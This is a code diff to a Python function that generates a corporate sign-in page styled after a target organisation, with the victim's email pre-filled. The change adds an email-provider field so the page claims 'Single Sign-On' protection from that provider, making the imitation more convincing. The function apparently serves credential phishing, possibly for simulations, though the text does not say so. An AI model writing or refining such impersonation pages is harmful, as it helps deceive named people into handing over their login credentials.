@@ -49,6 +49,7 @@ def generate_login_portal(
     footer_text: str | None = None
     target_email: str | None = None
     company_domain: str | None = None
+    email_provider: str | None = None
 
     for claim in claims:
         if not logo_url and claim.startswith("company_logo: "):
@@ -71,6 +72,8 @@ def generate_login_portal(
             val = _extract_field_value(claim, "email_pattern: ")
             if val and "@" in val:
                 company_domain = val.split("@")[1]
+        elif not email_provider and claim.startswith("email_provider: "):
+            email_provider = _extract_field_value(claim, "email_provider: ")
 
     # Defaults
     display_org = org_name or (company_domain.split(".")[0].capitalize() if company_domain else "Corporate")
@@ -85,6 +88,8 @@ def generate_login_portal(
         logo_html = f'<div style="font-size: 26px; font-weight: 700; color: #0f172a; margin-bottom: 24px; letter-spacing: -0.5px;">{display_org}</div>'
 
     email_value_attr = f'value="{target_email}"' if target_email else 'placeholder="name@company.com"'
+
+    provider_notice = f"Protected by {display_org} {email_provider} Single Sign-On." if email_provider else f"Protected by {display_org} Single Sign-On."
 
     html = f"""<!DOCTYPE html>
 <html lang="en">
@@ -207,7 +212,7 @@ def generate_login_portal(
       </div>
       <button type="submit" class="btn-submit">Sign In</button>
     </form>
-    <p class="security-notice">Protected by {display_org} Single Sign-On. Connections are encrypted.</p>
+    <p class="security-notice">{provider_notice} Connections are encrypted.</p>
   </div>
   <footer class="portal-footer">
     {final_footer}
@@ -224,4 +229,5 @@ def generate_login_portal(
         "brand_color": brand_color,
         "footer_text": final_footer,
         "prefilled_email": target_email,
+        "email_provider": email_provider,
     }
